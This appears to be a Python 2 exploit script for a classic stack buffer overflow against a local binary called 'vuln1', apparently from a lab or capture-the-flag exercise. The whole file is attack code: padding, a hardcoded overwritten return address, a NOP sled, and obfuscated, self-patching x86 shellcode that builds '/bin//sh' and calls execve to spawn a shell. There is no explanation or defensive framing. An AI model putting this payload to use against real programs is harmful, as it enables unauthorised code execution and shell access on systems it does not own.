#!/usr/bin/env python2
import struct
import subprocess

retaddr = 0xbffff198
sc = "\xeb\x21\x5e\x83\xc6\x03\x80\x06\x01\x83\xc6\x04\x80\x06\x01\x83\xc6\x01\x80\x06\x01\x83\xc6\x03\x80\x06\x02\x83\xc6\x01\x80\x06\x07\xeb\x05\xe8\xda\xff\xff\xff\x31\xc0\x50\x67\x2f\x2f\x73\x67\x67\x2f\x62\x67\x67\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# JUNK + RETADDR + NOP + SC
buf = "A" * 268
buf += struct.pack("<I",retaddr)
buf += "\x90" * 200
buf += sc

subprocess.call(["./vuln1", buf])
